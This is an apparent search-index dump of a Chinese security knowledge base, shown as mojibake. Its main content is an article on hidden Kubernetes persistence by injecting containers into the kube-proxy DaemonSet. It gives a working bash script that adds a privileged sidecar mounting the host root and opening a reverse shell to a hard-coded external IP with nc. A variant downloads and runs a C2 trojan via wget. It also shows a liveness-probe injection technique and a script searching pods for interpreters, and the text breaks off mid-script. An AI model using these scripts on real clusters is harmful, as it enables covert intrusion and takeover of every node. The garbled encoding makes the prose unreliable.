è‡ªèº«çš„ä¸€äº›æ¼æ´ä¹Ÿæ˜¯k8sç›¸å…³é£é™©\nk8sæ”»é˜²çŸ©é˜µ æˆ‘æ¥ä¸‹æ¥çš„ç¬”è®°ä¼šæŒ‰ç…§ä¸‹é¢è¿™ä¸ªæ”»é˜²çŸ©é˜µçš„æ¯ä¸€æ­¥æ¥è¿›è¡Œ\nåˆå§‹è®¿é—® æƒé™æå‡ é˜²å¾¡ç»•è¿‡ å‡­è¯çªƒå– æƒé™ç»´æŒ ç‰ˆæœ¬ä¿¡æ¯æ¢æµ‹ ç‰¹æƒå®¹å™¨é€ƒé€¸ å®¹å™¨åŠå®¿ä¸»æœºæ—¥å¿—æ¸…ç† Kubernetes secretçªƒå– åé—¨Pod insecure-portæœªæˆæƒè®¿é—® rolebindingæ·»åŠ ç”¨æˆ·æƒé™ Kubernetes auditæ—¥å¿—æ¸…ç† Kubernetes ServiceAccountæ³„éœ² Shadow-apiserver Api-serveråŒ¿åè®¿é—® ç›®å½•æŒ‚è½½é€ƒé€¸ åˆ©ç”¨ç³»ç»ŸPodä¼ªè£… åº”ç”¨å±‚Apiå‡­æ®æ³„éœ² cronjobæŒä¹…åŒ– Kubeconfigæ³„éœ² æ“ä½œç³»ç»Ÿå†…æ ¸æ¼æ´é€ƒé€¸ é€šè¿‡ä»£ç†è®¿é—®Api-server åˆ©ç”¨Kuberneteså‡†å…¥æ§åˆ¶å™¨è·å–ä¿¡æ¯ åé—¨é•œåƒ Kubeletæœªæˆæƒè®¿é—® Dockeræ¼æ´é€ƒé€¸ å…³é—­å®‰å…¨äº§å“å¹³å°å®¹å™¨ PodæœåŠ¡è´¦æˆ·å‡­æ®çªƒå– ä¿®æ”¹æ ¸å¿ƒç»„ä»¶è®¿é—®æƒé™ Docker daemonæœªæˆæƒè®¿é—® Kubernetesæ¼æ´ææƒ åˆ›å»ºè¶…é•¿Annotations ç³»ç»Ÿå±‚åé—¨ é€šè¿‡Nodeportè®¿é—®Service Docker.socké€ƒé€¸ CVE-2019-1002101 DaemonSetsåé—¨ Dashboardæœªæˆæƒè®¿é—® Linux Capabilitiesé€ƒé€¸ etcdæœªæˆæƒè®¿é—® CVE-2018-1002105 æ¥æºï¼šhttps://www.netstarsec.com/amulab/\n",
        "summary": "Kuberneteså®‰å…¨åŸºç¡€ æ–‡ç« é¦–å‘äºtrackå®‰å…¨ç¤¾åŒºï¼šK8sæ¸—é€å…¥é—¨ä»é›¶åˆ°ä¸€\nk8såŸºç¡€ k8sæ¶æ„ Kubernetes åˆç§° k8sï¼Œæ˜¯ Google åœ¨ 2014 å¹´å¼€æºçš„ä¸€ä¸ªç”¨æ¥ç®¡ç†å®¹å™¨çš„å¹³å°\nk8såŸºæœ¬æ¶æ„å¦‚ä¸‹ï¼š ä»ä¸Šå›¾æ¥çœ‹å¯ä»¥çŸ¥é“ï¼Œk8sä¸»è¦ç”±è¾ƒå°‘çš„masterèŠ‚ç‚¹å’Œå…¶å¯¹åº”çš„å¤šä¸ªNodeèŠ‚ç‚¹ç»„æˆï¼ŒmasterèŠ‚ç‚¹å¯¹nodeåŠè¯¶å•è¿›è¡Œç®¡ç†æ§åˆ¶ï¼Œä¸€ä¸ªK8sé›†ç¾¤è‡³å°‘è¦æœ‰ä¸€å°masterèŠ‚ç‚¹\nmasterèŠ‚ç‚¹ä¸»è¦æœ‰ä»¥ä¸‹æ ¸å¿ƒç»„ä»¶ï¼š\netcd ä¿å­˜äº†æ•´ä¸ªé›†ç¾¤çš„çŠ¶æ€ API Server æä¾›äº†èµ„æºæ“ä½œçš„å”¯ä¸€å…¥å£ï¼Œå¹¶æä¾›è®¤è¯ã€æˆæƒã€è®¿é—®æ§åˆ¶ã€API æ³¨å†Œå’Œå‘ç°ç­‰æœºåˆ¶ Controller Manager è´Ÿè´£ç»´æŠ¤é›†ç¾¤çš„çŠ¶æ€ï¼Œæ¯”å¦‚æ•…éšœæ£€æµ‹ã€è‡ªåŠ¨æ‰©å±•ã€æ»šåŠ¨æ›´æ–°ç­‰ Scheduler è´Ÿè´£èµ„æºçš„è°ƒåº¦ï¼ŒæŒ‰ç…§é¢„å®šçš„è°ƒåº¦ç­–ç•¥å°† Pod è°ƒåº¦åˆ°ç›¸åº”çš„æœºå™¨ä¸Š nodeèŠ‚ç‚¹æœ‰ä»¥ä¸‹æ ¸å¿ƒç»„ä»¶ï¼š\nKubelet è´Ÿè´£ç»´æŠ¤å®¹å™¨çš„ç”Ÿå‘½å‘¨æœŸï¼ŒåŒæ—¶ä¹Ÿè´Ÿè´£Volumeï¼ˆCVIï¼‰å’Œç½‘ç»œï¼ˆCNIï¼‰çš„ç®¡ç†ï¼Œæ¯ä¸ªnodeèŠ‚ç‚¹ä¸­éƒ½å­˜åœ¨ä¸€ä»½\nContainer Runtime è´Ÿè´£é•œåƒç®¡ç†ä»¥åŠ Pod å’Œå®¹å™¨çš„çœŸæ­£è¿è¡Œï¼ˆCRIï¼‰ï¼Œæ—©æœŸæ˜¯dockerå¼•æ“ä½œä¸ºç»„ä»¶ï¼Œä»v1.20å¼€å§‹ä½¿ç”¨ containerdã€CRI-O ç­‰\nKube-proxy è´Ÿè´£ä¸º Service æä¾› Cluster å†…éƒ¨çš„æœåŠ¡å‘ç°å’Œè´Ÿè½½å‡è¡¡\npod æ˜¯k8sä¸­çš„æœ€å°è°ƒåº¦å•ä½ï¼Œpodå†…éƒ¨å°±æ˜¯å®¹å™¨ï¼Œk8sé€šè¿‡æ“ä½œpodæ¥æ§åˆ¶å®¹å™¨ï¼Œä¸€ä¸ªnodeä¸‹é¢å¯ä»¥æœ‰å¤šä¸ªpod\nfluentdä¸æ˜¯ Kubernetes çš„æ ¸å¿ƒç»„ä»¶ï¼Œä½†å¸¸ç”¨äºæ—¥å¿—æ”¶é›†ï¼Œå°† Pod çš„ stdout/stderr æ—¥å¿—é‡‡é›†åˆ°é›†ä¸­ç³»ç»Ÿï¼ˆå¦‚ Elasticsearchã€Kafkaï¼‰ä¸­ã€‚\nPodå¯ä»¥è¯´æ˜¯NodeèŠ‚ç‚¹ä¸­æœ€æ ¸å¿ƒçš„éƒ¨åˆ†ï¼ŒPodä¹Ÿæ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œå®ƒæ˜¯ä¸€ä¸ªâ€ç”¨æ¥å°è£…å®¹å™¨çš„å®¹å™¨â€ã€‚ä¸€ä¸ªPodä¸­å¾€å¾€ä¼šè£…è½½å¤šä¸ªå®¹å™¨ï¼Œè¿™äº›å®¹å™¨å…±ç”¨ä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒï¼Œå…±äº«ç€ç½‘ç»œå’Œå­˜å‚¨ç­‰èµ„æº\nè¿™äº›å®¹å™¨çš„èµ„æºå…±äº«ä»¥åŠç›¸äº’äº¤äº’éƒ½æ˜¯ç”±podé‡Œé¢çš„pauseå®¹å™¨æ¥å®Œæˆçš„ï¼Œæ¯åˆå§‹åŒ–ä¸€ä¸ªpodæ—¶ä¾¿ä¼šç”Ÿæˆä¸€ä¸ªpauseå®¹å™¨\nk8sç‰¹ç‚¹ å’Œdockerç›¸æ¯”ï¼Œdockeræ›´åå‘äºå•æœºç®¡ç†ï¼Œè€Œk8såˆ™æ˜¯åå‘äºå¤šæœºé›†ç¾¤ç®¡ç†ï¼Œç”±äºå®¹å™¨çš„å¯¿å‘½æ¯”è¾ƒçŸ­æš‚ï¼Œéœ€è¦ç»å¸¸è°ƒè¯•ç¯å¢ƒï¼Œè€Œé‡æ–°æ‰“åŒ…éƒ¨ç½²å®¹å™¨æ¯”è¾ƒéº»çƒ¦ï¼Œåˆä¼šå­˜åœ¨ä¸€ç³»åˆ—é—®é¢˜ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºç½‘ç»œï¼Œæ•°æ®åŒæ­¥ç­‰ï¼Œå› æ­¤æ‰æœ‰äº†K8Sæ¥å¯¹å®¹å™¨è¿›è¡Œéƒ¨ç½²å’Œç®¡ç†\nk8så…·æœ‰å¦‚ä¸‹çš„ç‰¹ç‚¹ï¼š\nè‡ªæˆ‘ä¿®å¤ï¼šå¯¹å®¹å™¨è¿›è¡Œç›‘æµ‹ï¼Œå‡ºç°é—®é¢˜å°±åœ¨åŸæœ‰æ— é—®é¢˜å®¹å™¨åŸºç¡€ä¸Šè¿›è¡Œå¤åˆ¶å¯åŠ¨ï¼Œå‡ºç°é—®é¢˜çš„å®¹å™¨è¿›è¡ŒæŠ›å¼ƒæˆ–é‡å¯\nå¼¹æ€§ä¼¸ç¼©ï¼šå®¹å™¨æ•°é‡çš„æ§åˆ¶\nè‡ªåŠ¨éƒ¨ç½²å’Œå›æ»šï¼šé€šè¿‡é…ç½®æ–‡ä»¶è¿›è¡Œè‡ªåŠ¨çš„å®¹å™¨æ„å»ºï¼Œå¯¹å®¹å™¨çš„å›æ»šæ›´æ–°\næœåŠ¡å‘ç°å’Œè´Ÿè½½å‡è¡¡ï¼šé»˜è®¤æ–¹æ¡ˆ\næœºå¯†å’Œé…ç½®ç®¡ç†ï¼šå¯¹æ•æ„Ÿæ•°æ®æˆ–å…¶ä»–è¿›è¡Œé…ç½®ç®¡ç†\nå­˜å‚¨ç¼–æ’ï¼šè™šæ‹Ÿç£ç›˜ä¸ç‰©ç†ç£ç›˜\næ‰¹å¤„ç†ï¼šæ‰¹é‡ä»»åŠ¡å®ç°\nk8så·¥ä½œæµç¨‹ kubectl æ˜¯ k8s çš„å®¢æˆ·ç«¯å·¥å…·ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤è¡Œç®¡ç†é›†ç¾¤\n"
    }
,
    {
        "title": "k8sæƒé™ç»´æŒ-åŠ¨æ€å®¹å™¨æ³¨å…¥",
        "link": "/My-Knowlege-Database/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%8A%A8%E6%80%81%E5%AE%B9%E5%99%A8%E6%B3%A8%E5%85%A5/",
        "content": "åŠ¨æ€å®¹å™¨æ³¨å…¥-ä¸€ç§éšè”½çš„k8sæƒé™ç»´æŒæ–¹æ³• æ¶æ„pod-\u0026gt;åå¼¹shell-\u0026gt;æŒ‚è½½å®¿ä¸»æœº(node)/-\u0026gt;cronå†™å®šæ—¶ä»»åŠ¡åå¼¹shell-\u0026gt;master-node\nk8sæ§åˆ¶å™¨\nä¼—æ‰€å‘¨çŸ¥ï¼Œk8sçš„æŒä¹…åŒ–æœ‰å¾ˆå¤šæ–¹æ³•ï¼š\néƒ¨ç½²åé—¨pod éƒ¨ç½²cronjob éƒ¨ç½²shadowApiserver éƒ¨ç½²æ¶æ„deployment éƒ¨ç½²æ¶æ„deamonset è¿™äº›æ–¹æ³•å¤§å®¶æƒ³å¿…éƒ½å¾ˆç†Ÿæ‚‰äº†ï¼Œè€Œè¿™äº›æ–¹æ³•éƒ½éœ€è¦æˆ‘ä»¬é¢å¤–åˆ›å»ºæ–°çš„podæˆ–è€…k8sæ§åˆ¶å™¨ï¼Œk8sä¸­å¤šå‡ºæ¥ä¸€äº›podå’Œæ§åˆ¶å™¨å¾ˆå®¹æ˜“å°±è¢«å‘ç°äº†ï¼Œæœ‰æ²¡æœ‰ä»€ä¹ˆèƒ½å¤Ÿåˆ©ç”¨åŸæœ‰æ§åˆ¶å™¨å’Œpodçš„åŠæ³•å‘¢ï¼Ÿ\nè¿™é‡Œå°±æœ‰ä¸€ç§å«åšåŠ¨æ€å®¹å™¨æ³¨å…¥çš„æ–¹å¼\nç›®å‰æ¥è¯´çš„æ³¨å…¥æ–¹å¼æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯å°†ä¸€ä¸ªsidecarå®¹å™¨æ³¨å…¥åˆ°åŸæœ‰podä¸­ï¼Œä¸€ç§æ˜¯å°†å­˜æ´»æ¢é’ˆæ³¨å…¥åˆ°åŸæœ‰podä¸­\nåˆ©ç”¨sidecarå®¹å™¨æŠ€æœ¯è¿›è¡Œæ³¨å…¥ è¿™é‡Œæåˆ°ä¸€ä¸ªæŠ€æœ¯å«sidecarï¼Œç®€å•ç†è§£å°±æ˜¯åœ¨åŒä¸€ä¸ª Pod é‡Œé¢å¤–æ”¾ä¸€åªå®¹å™¨ï¼Œä¸ºä¸»ä¸šåŠ¡å®¹å™¨æä¾›å¢å¼ºèƒ½åŠ›ï¼Œç”Ÿå‘½å‘¨æœŸä¸ä¸»å®¹å™¨å®Œå…¨ä¸€è‡´ï¼ˆåŒå¯ã€åŒåœã€åŒç½‘ç»œã€åŒå­˜å‚¨å·ï¼‰ã€‚å…·ä½“æŠ€æœ¯ç”¨é€”å¯ä»¥åœ¨å®˜æ–¹æ–‡æ¡£äº†è§£ï¼šhttps://kubernetes.io/zh-cn/docs/concepts/workloads/pods/sidecar-containers/\nè¿™é‡Œå¯ä»¥åˆ©ç”¨k8sæ§åˆ¶å™¨ï¼Œåƒdaemonsetè¿™ç±»ï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ”¹å®ƒyamlçš„spec.templateçš„å†…å®¹ï¼Œå¹¶replaceè§¦å‘å…¶æ›´æ–°ï¼Œè¿™æ ·å°±èƒ½å®ç°åœ¨åŸå®¹å™¨ä¸Šå¢åŠ ä¸€ä¸ªæ¶æ„çš„sidecarå®¹å™¨ï¼Œè€Œä¸ç”¨å¢åŠ ä¸€ä¸ªæ–°çš„æ§åˆ¶å™¨æˆ–ç‹¬ç«‹pod\nä¸ºä»€ä¹ˆé€‰æ‹©daemonsetï¼š\nå®ƒèƒ½å¤Ÿç¡®ä¿æ‰€æœ‰èŠ‚ç‚¹ï¼ˆåŒ…æ‹¬æ–°å¢èŠ‚ç‚¹ï¼‰ä¸Šéƒ½è¿è¡Œä¸€ä¸ªPod\nå¦‚æœæœ‰Podé€€å‡ºï¼ŒDaemonSetå°†åœ¨å¯¹åº”èŠ‚ç‚¹ä¸Šè‡ªåŠ¨é‡å»ºä¸€ä¸ªPod\nå€¼å¾—ä¸€é¢˜çš„æ˜¯ï¼Œæˆ‘ä»¬æ³¨å…¥çš„æ¶æ„å®¹å™¨éœ€è¦æ€ä¹ˆé…ç½®æ¯”è¾ƒå¥½å‘¢ï¼Œæ€è·¯å¯ä»¥ä»å»é™¤å®¹å™¨ä¸å®¿ä¸»æœºéš”ç¦»çš„è§’åº¦å‡ºå‘ï¼š\nå®¹å™¨æ˜¯ç‰¹æƒçš„ï¼ˆç›¸å½“äºdocker runçš„æ—¶å€™å¸¦äº†â€“privilegedé€‰é¡¹ï¼‰\nå®¹å™¨ä¸å®¿ä¸»æœºå…±äº«ç½‘ç»œå’ŒPIDå‘½åç©ºé—´ï¼ˆæ‰“ç ´å‘½åç©ºé—´éš”ç¦»ï¼‰\nå®¹å™¨å†…æŒ‚è½½å®¿ä¸»æœºæ ¹ç›®å½•ï¼ˆæ‰“ç ´æ–‡ä»¶ç³»ç»Ÿéš”ç¦»ï¼‰\nè¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬è·å¾—sidecarå®¹å™¨çš„shellå®é™…ä¸Šå’ŒèŠ‚ç‚¹çš„shellåŒºåˆ«å°±ä¸å¤§äº†\nåŸºç¡€æ³¨å…¥ ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬ä¼šè€ƒè™‘å¯¹kube-systemå‘½åç©ºé—´ä¸­å·²è¿è¡Œçš„daemonsetè¿›è¡Œæ³¨å…¥ï¼Œå¸¸ç”¨çš„æ˜¯k8sä¸­çš„kube-proxyï¼Œæ¯”å¦‚æ¥ä¸‹æ¥è¿™ä¸ªä¾‹å­ï¼š\næˆ‘ä»¬æ¢æµ‹ä¸€ä¸‹æ˜¯å¦å­˜åœ¨kube-proxyï¼š\nkubectl get daemonset -n kube-system æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°è¿™ä¸ªdaemonsetæ§åˆ¶çš„podï¼š\næ¥ä¸‹æ¥æˆ‘ä»¬æ¥è¯»è¿™ä¸ªdaemonsetçš„yamlï¼š\nkubectl get daemonset -n kube-system -o yaml æˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸ªyamlåŸºç¡€ä¸Šè¿›è¡Œä¿®æ”¹å®ç°æ³¨å…¥ï¼š\næˆ‘ä»¬å…ˆåˆ†æåŸyamlçš„specï¼š\nspec: revisionHistoryLimit: 10 selector: matchLabels: k8s-app: kube-proxy template: metadata: creationTimestamp: null labels: k8s-app: kube-proxy spec: containers: - command: - /usr/local/bin/kube-proxy - --config=/var/lib/kube-proxy/config.conf - --hostname-override=$(NODE_NAME) env: - name: NODE_NAME valueFrom: fieldRef: apiVersion: v1 fieldPath: spec.nodeName image: registry.k8s.io/kube-proxy:v1.30.14 imagePullPolicy: IfNotPresent name: kube-proxy resources: {} securityContext: privileged: true terminationMessagePath: /dev/termination-log terminationMessagePolicy: File volumeMounts: - mountPath: /var/lib/kube-proxy name: kube-proxy - mountPath: /run/xtables.lock name: xtables-lock - mountPath: /lib/modules name: lib-modules readOnly: true dnsPolicy: ClusterFirst hostNetwork: true nodeSelector: kubernetes.io/os: linux priorityClassName: system-node-critical restartPolicy: Always schedulerName: default-scheduler securityContext: {} serviceAccount: kube-proxy serviceAccountName: kube-proxy terminationGracePeriodSeconds: 30 tolerations: - operator: Exists volumes: - configMap: defaultMode: 420 name: kube-proxy name: kube-proxy - hostPath: path: /run/xtables.lock type: FileOrCreate name: xtables-lock - hostPath: path: /lib/modules type: \u0026#34;\u0026#34; name: lib-modules updateStrategy: rollingUpdate: maxSurge: 0 maxUnavailable: 1 type: RollingUpdate æˆ‘ä»¬åªéœ€è¦åœ¨æ­¤åŸºç¡€ä¸Šå¢åŠ ä¸¤ä¸ªæ–°å¯¹è±¡ï¼š\nä¸€ä¸ªæ–° volumeï¼ˆhostPath=/ï¼ŒæŠŠæ•´ä¸ªå®¿ä¸»æœºæ ¹ç›®å½•æŒ‚è¿›æ¥ï¼‰ ä¸€ä¸ªæ–° containerï¼ˆsidecarï¼Œåå­—/é•œåƒçœ‹ä¼¼æ­£å¸¸ï¼Œå®é™…è·‘æ¶æ„å‘½ä»¤ï¼‰ é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªè‡ªåŠ¨æ³¨å…¥è„šæœ¬ï¼Œå®ç°æ³¨å…¥ä¸€ä¸ªæŒ‚è½½å®¿ä¸»æœºæ ¹ç›®å½•å¹¶ä¸”å¯åŠ¨æ—¶ä¼šæ‰§è¡Œåå¼¹shellçš„sidecarâ€˜å®¹å™¨ï¼š\n#!/usr/bin/env bash # inject-cache.sh -- è‡ªåŠ¨æå–åŸyamlå¹¶æ³¨å…¥â€œcacheâ€è¾¹è½¦å®¹å™¨ # ç”¨æ³•ï¼š./inject-cache.sh set -e #################### 1. è‡ªåŠ¨æå–åŸyaml #################### image=$(kubectl -n kube-system get ds kube-proxy -o yaml \\ | awk \u0026#39;$1==\u0026#34;image:\u0026#34;{print $2}\u0026#39; | head -n1) #################### 2. å›ºå®šå˜é‡ #################### volume_name=cache mount_path=/var/kube-proxy-cache ctr_name=kube-proxy-cache #################### 3. æ„å»ºæ³¨å…¥éƒ¨åˆ† #################### volume_block=\u0026#34;\\ - name: ${volume_name}\\n\\ hostPath:\\n\\ path: /\\n\\ type: Directory\u0026#34; container_block=\u0026#34;\\ - name: ${ctr_name}\\n\\ image: alpine:latest\\n\\ imagePullPolicy: IfNotPresent\\n\\ command: [\\\u0026#34;/bin/sh\\\u0026#34;]\\n\\ args:\\n\\ - -c\\n\\ - \u0026#39;set -x; nc 8.156.69.160 2333 -e /bin/sh \u0026amp; tail -f /dev/null\u0026#39;\\n\\ securityContext:\\n\\ privileged: true\\n\\ volumeMounts:\\n\\ - mountPath: ${mount_path}\\n\\ name: ${volume_name}\u0026#34; #################### 4. ä½¿ç”¨ awk æ³¨å…¥å¹¶æ»šåŠ¨æ›´æ–° #################### kubectl -n kube-system get ds kube-proxy -o yaml \\ | awk -v vb=\u0026#34;$volume_block\u0026#34; -v cb=\u0026#34;$container_block\u0026#34; \u0026#39; /^ volumes:/ { print; print vb; next } /^ containers:/ { print; print cb; next } 1 \u0026#39; \\ | kubectl replace -f - echo \u0026#34;[+] Injection done, waiting for rollout...\u0026#34; kubectl -n kube-system rollout status ds/kube-proxy echo \u0026#34;[+] All nodes now run the cache container with host root at ${mount_path} and privileged=true\u0026#34; åœ¨vpsä¸Šç›‘å¬ï¼Œå¹¶åœ¨masterèŠ‚ç‚¹ä¸Šæ‰§è¡Œè„šæœ¬ï¼š å¯ä»¥çœ‹åˆ°æ³¨å…¥æˆåŠŸï¼ŒæŒ‚è½½çš„å®¿ä¸»æœºæ ¹ç›®å½•ä½äº/var/kube-proxy-cache\nvpsæˆåŠŸæ”¶åˆ°åå¼¹shellä¸”èƒ½è®¿é—®å®¿ä¸»æœºï¼š\næ­¤æ—¶åœ¨masterèŠ‚ç‚¹æŸ¥çœ‹è¢«æ³¨å…¥åçš„kube-proxyï¼Œå¯ä»¥çœ‹åˆ°åªæœ‰æ•°é‡å¢åŠ äº†ï¼Œç›¸å½“éšè”½ï¼š\næ€è·¯ä¼˜åŒ– å€¼å¾—ä¸€æçš„æ˜¯ï¼Œæˆ‘ä»¬çŸ¥é“åä¸ºkube-proxyçš„daemonsetæ§åˆ¶äº†æ¯ä¸ªèŠ‚ç‚¹ä¸Šçš„kube-proxyç›¸å…³podï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨è¿›è¡Œæ³¨å…¥åï¼Œæ¯ä¸ªèŠ‚ç‚¹ä¸Šçš„kube-proxyç›¸å…³podéƒ½ä¼šå¢åŠ ä¸€ä¸ªæ¶æ„çš„sidecarå®¹å™¨ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼šæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡æ­¤æ–¹æ³•ä¸€æ¬¡æ€§è·å¾—æ¯ä¸ªèŠ‚ç‚¹ä¸Šæ¶æ„å®¹å™¨çš„åå¼¹shellï¼Œå†é€ƒé€¸å³å¯è·å¾—æ‰€æœ‰nodeèŠ‚ç‚¹æƒé™ï¼Œè¾ƒä¸ºæ–¹ä¾¿\né‚£ä¹ˆè¿™é‡Œå°±åˆæœ‰é—®é¢˜äº†ï¼šä½¿ç”¨ncæ¥ç›‘å¬åå¼¹çš„shellï¼Œä¸€æ¬¡åªèƒ½æ¥å—ä¸€ä¸ªï¼Œæ‰€ä»¥å¦‚æœæŒ‰ç…§ä¸Šé¢è„šæœ¬çš„æ–¹æ³•æ¥è®©æ‰€æœ‰æ¶æ„å®¹å™¨åå¼¹shellä¸æ˜¯ä¸€ä¸ªå¥½åŠæ³•ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨c2æœ¨é©¬æ¥è¿›è¡Œä¸Šçº¿\nå¹¶ä¸”c2ä¸Šçº¿è¿˜æœ‰ä¸ªå¥½å¤„ï¼š\nä¸€æ—¦ç”±äºæ“ä½œä¸å½“ç­‰åŸå› ä¸å°å¿ƒæ–­å¼€äº†ä¸€ä¸ªåè¿çš„shellï¼Œå¯¹åº”Podå°†è¿è¡Œç»“æŸï¼ŒDaemonSetç›‘æµ‹åˆ°Podé€€å‡ºï¼Œå°†è‡ªåŠ¨åœ¨ç›¸åŒèŠ‚ç‚¹ä¸Šé‡å»ºä¸€ä¸ªæ–°Podï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿåœ¨c2ä¸Šé‡æ–°æ”¶è·ä¸€ä¸ªåå¼¹shellï¼Œå¯ä»¥å¾ˆå¥½çš„æå‡å¯ç”¨æ€§\né‚£ä¹ˆæœ€ç®€å•ã€é€šç”¨çš„ä¿®æ”¹æ–¹å¼å°±æ˜¯æ”¹æ³¨å…¥è„šæœ¬çš„container_blockç‰‡æ®µï¼ŒæŠŠåå¼¹shellçš„å‘½ä»¤æ”¹ä¸ºè®¿é—®æˆ‘ä»¬çš„vpsï¼Œä¸‹è½½å¹¶æ‰§è¡Œæœ¨é©¬ï¼š\ncontainer_block=\u0026#34;\\ - name: ${ctr_name}\\n\\ image: alpine:latest\\n\\ imagePullPolicy: IfNotPresent\\n\\ command: [\\\u0026#34;/bin/sh\\\u0026#34;]\\n\\ args:\\n\\ - -c\\n\\ - \u0026#39;set -x; wget http://\u0026lt;IP:PORT\u0026gt;/kube-proxy -O /root/kube-proxy \u0026amp;\u0026amp; chmod 777 /root/kube-proxy \u0026amp;\u0026amp; /root/kube-proxy\u0026#39;\\n\\ securityContext:\\n\\ privileged: true\\n\\ volumeMounts:\\n\\ - mountPath: ${mount_path}\\n\\ name: ${volume_name}\u0026#34; è¿™æ ·åœ¨masterèŠ‚ç‚¹æ‰§è¡Œè„šæœ¬åï¼Œå°±èƒ½ä¸€æ¬¡æ€§å°†k8så†…çš„æ‰€æœ‰èŠ‚ç‚¹çš„kube-proxyæ³¨å…¥å®¹å™¨ä¸Šçº¿C2ï¼š å¦å¤–å¤§å®¶å¯ä»¥è¿›ä¸€æ­¥æ€è€ƒï¼Œæ¯”å¦‚å¦‚ä½•é’ˆå¯¹è‡ªå·±ä¸åŒçš„C2å®ç°ä¸åŒçš„æ— æ–‡ä»¶è½åœ°ä¸Šçº¿æ–¹æ¡ˆï¼Œè¿™é‡Œå°±ä¸å¤šç ”ç©¶äº†\nåˆ©ç”¨å­˜æ´»æ¢é’ˆæŠ€æœ¯è¿›è¡Œæ³¨å…¥ åŸºç¡€æ³¨å…¥ é‚£ä¹ˆä¸Šé¢çš„æ–¹æ¡ˆè¿˜æœ‰å…¶ä»–å€¼å¾—æ³¨æ„çš„é—®é¢˜å—ï¼Ÿå½“ç„¶ï¼Œä½¿ç”¨sidecarå®¹å™¨æ³¨å…¥ä¼šå¯¼è‡´podæ˜¾ç¤ºçš„å®¹å™¨æ•°é‡å¢åŠ ï¼Œä¸å¥½ç»•è¿‡ç»†è‡´çš„æ’æŸ¥ï¼›å¦å¤–ï¼Œå¯ä»¥æ³¨æ„åˆ°ä¸Šé¢æ³¨å…¥å®¹å™¨çš„æ—¶å€™ï¼Œæˆ‘ä»¬æ‹‰å–äº†æ–°çš„é•œåƒalpine:latestï¼Œé‚£å¦‚æœå½“å‰å†…ç½‘ç¯å¢ƒä¸­ä¸å…è®¸ä»å¤–éƒ¨æ‹‰å–å®¹å™¨å‘¢ï¼Ÿ\nè¿™é‡Œå°±å¯ä»¥ç”¨åˆ°ä¸€ä¸ªæ–°çš„æ€è·¯ï¼šåˆ©ç”¨æ¢é’ˆ\næ¢é’ˆæ˜¯åœ¨å®¹å™¨è¿è¡Œå‘¨æœŸä¸­è§¦å‘çš„ä¸€ä¸ªæ£€æµ‹æœºåˆ¶ï¼Œæ¢é’ˆçš„è¯¦ç»†ä»‹ç»å¯ä»¥åœ¨å®˜æ–¹æ–‡æ¡£çœ‹åˆ°ï¼šhttps://kubernetes.io/zh-cn/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/\næ¢é’ˆæœ‰ä¸‰ç§ï¼Œå…¶ä¸­å­˜æ´»æ¢é’ˆå¯ä»¥åœ¨å®¹å™¨æ•´ä¸ªç”Ÿå‘½å‘¨æœŸä¸­æŒç»­è§¦å‘ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•é€šè¿‡å­˜æ´»æ¢é’ˆæ¥å®ç°ä¸æ‹‰å–é•œåƒçš„åŠ¨æ€å®¹å™¨æ³¨å…¥ï¼š\nä½¿ç”¨å­˜æ´»æ¢é’ˆçš„execæ£€æŸ¥æ¨¡å¼å®ç°å‘½ä»¤æ‰§è¡Œåå¼¹shell ä½¿ç”¨æ¢é’ˆå‚æ•°failureThreshold: 2147483647ï¼Œè®¾ç½®æœ€å¤§çš„å¤±è´¥é‡è¯•æ¬¡æ•°ï¼Œå®ç°å‡ ä¹â€œæ— é™æ¬¡â€é‡å¤æ‰§è¡Œ ä½¿ç”¨periodSeconds: xå‚æ•°æ¥è®¾ç½®é—´éš”ä¸ºxç§’ ä¸ºäº†æ–¹ä¾¿åå¼¹shellï¼Œé¦–å…ˆéœ€è¦æ‰¾åˆ°æ‰€ä»¥daemonsetæ§åˆ¶çš„podæ˜¯å¦æœ‰bashæˆ–perlç­‰è¯­è¨€è§£é‡Šå™¨ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™æ ·ä¸€ä¸ªè„šæœ¬æ¥å¯»æ‰¾ï¼š\nfor ds in $(kubectl get daemonsets -A -o jsonpath=\u0026#39;{range .items[*]}{.metadata.namespace}/{.metadata.name}{\u0026#34;\\n\u0026#34;}{end}\u0026#39;); do ns=$(echo $ds | cut -d/ -f1) name=$(echo $ds | cut -d/ -f2) # è·å– selector çš„é”®å€¼å¯¹æ•°ç»„ keys=$(kubectl get daemonset $name -n $ns -o jsonpath=\u0026#39;{.spec.selector.matchLabels}\u0026#39; | tr -d \u0026#39;{}\u0026#39; | tr \u0026#39;,\u0026#39; \u0026#39;\\n\u0026#39; | awk -F: \u0026#39;{gsub(/\u0026#34;/,\u0026#34;\u0026#34;,$1); gsub(/\u0026#34;/,\u0026#34;\u0026#34;,$2); print $1\u0026#34;=\u0026#34;$2}\u0026#39;) # æ‹¼æ¥æˆ label selector å­—ç¬¦ä¸² selector=\u0026#34;\u0026#34; for k in $keys; do if [ -z \u0026#34;$selector\u0026#34; ]; then selector=\u0026#34;$k\u0026#34; else selector=\u0026#34;$selector,$k\u0026#34; fi done # è·å– Pod pod=$(kubectl get pods -n $ns -l \u0026#34;$selector\u0026#34; -o jsonpath=\u0026#39;{.items[0].metadata.name}\u0026#39; 2\u0026gt;/dev/null) if [ -z 